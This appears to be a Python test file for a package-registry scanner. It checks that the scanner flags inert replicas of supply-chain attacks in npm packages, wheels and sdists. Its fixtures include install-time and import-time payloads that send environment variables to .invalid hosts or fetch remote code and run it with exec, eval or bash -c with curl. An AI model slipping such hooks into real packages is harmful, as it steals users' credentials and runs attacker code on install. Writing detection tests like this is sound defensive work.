"""The registry on the two replica gaps: a binding.gyp command expansion that
runs the package's payload (Miasma v2), and import-time code that runs what
it downloads (TrapDoor). The scanner's tests (tests/scanner/
test_review_gyp_expansions.py, test_review_received_code.py) cover the rules;
these check the verdicts: the registry follows an expansion's INFO finding
like any hook, and its install-script and import-time tests are core's.

Payloads are inert: hosts are .invalid, nothing is extracted or executed.
"""

import unittest

from tests.registry._review_support import issues, manifest, scan_npm, scan_sdist, scan_wheel

WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
EXFIL_JS = ("const data = JSON.stringify(process.env);\n"
            "fetch('https://collector.invalid/collect', { method: 'POST', body: data });\n")
TRAPDOOR_PY = ("import subprocess, urllib.request\n"
               "code = urllib.request.urlopen('https://files.invalid/p.js').read().decode()\n"
               "subprocess.run(['node', '-e', code])\n")
REASON = "runs code it receives over the network"


def hook_findings(res):
    return sorted((i["file"], i["sev"], i["msg"]) for i in issues(res, "SC-INSTALL-HOOK"))


class GypExpansionVerdictTests(unittest.TestCase):
    def test_the_miasma_replica_is_suspicious(self):
        res = scan_npm({"package.json": manifest(main="index.js"),
                        "binding.gyp": "{'targets': [{'target_name': 'stub', "
                                       "'sources': ['<!(node index.js > /dev/null 2>&1 && echo stub.c)']}]}\n",
                        "index.js": EXFIL_JS})
        env = "reads environment variables or credential files and sends data over the network"
        self.assertIn(("binding.gyp", "CRITICAL", f"Install hook runs index.js, which {env}."), hook_findings(res))
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_benign_expansion_is_inventory(self):
        res = scan_npm({"package.json": manifest(),
                        "binding.gyp": "{'targets': [{'target_name': 'n', 'sources': ['<!(node ./gen.js)']}]}\n",
                        "gen.js": "console.log('n.cc');\n"})
        self.assertEqual(hook_findings(res), [
            ("binding.gyp", "INFO", "\"binding.gyp command expansion\" script runs code at install time: "
                                    "'node ./gen.js'."),
            ("binding.gyp", "MAJOR", "\"install (implicit)\" script runs code at install time: 'node-gyp rebuild'.")])
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])     # the implicit hook, as before

    def test_a_pymod_do_main_module(self):
        res = scan_npm({"package.json": manifest(),
                        "binding.gyp": "{'variables': {'v': '<!pymod_do_main(helper)'}}\n",
                        "helper.py": ("import os, json, urllib.request\n"
                                      "urllib.request.urlopen('https://collector.invalid/c', "
                                      "data=json.dumps(dict(os.environ)).encode())\n\n"
                                      "def DoMain(argv):\n    return ''\n")})
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])


class ReceivedCodeVerdictTests(unittest.TestCase):
    def test_the_trapdoor_replica_in_a_wheel(self):
        res = scan_wheel({**WHEEL_META, "trapdoor_py/__init__.py": TRAPDOOR_PY})
        (hit,) = issues(res, "SC-IMPORT-RISK")
        self.assertEqual((hit["file"], hit["sev"], hit["line"]), ("trapdoor_py/__init__.py", "MAJOR", 3))
        self.assertIn(REASON, hit["msg"])
        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])

    def test_in_setup_py_it_is_critical(self):
        res = scan_sdist({"setup.py": ("import requests\nexec(requests.get('https://files.invalid/p.py').text)\n"
                                       "from setuptools import setup\nsetup(name='x')\n")})
        (hit,) = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual(hit["sev"], "CRITICAL")
        self.assertIn(REASON, hit["msg"])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_in_an_npm_install_script_it_is_critical(self):
        res = scan_npm({"package.json": manifest(scripts={"postinstall": "node install.js"}),
                        "install.js": ("const https = require('https');\n"
                                       "https.get('https://files.invalid/p.js', (res) => {\n  let b = '';\n"
                                       "  res.on('data', (c) => { b += c; });\n  res.on('end', () => eval(b));\n});\n")})
        self.assertEqual(hook_findings(res), [("package.json", "CRITICAL", f"Install hook runs install.js, which {REASON}.")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_shell_install_script_substituting_a_download(self):
        res = scan_npm({"package.json": manifest(scripts={"postinstall": "sh ./install.sh"}),
                        "install.sh": "#!/bin/sh\nbash -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n"})
        self.assertEqual(hook_findings(res), [("package.json", "CRITICAL", f"Install hook runs ./install.sh, which {REASON}.")])


if __name__ == "__main__":
    unittest.main()
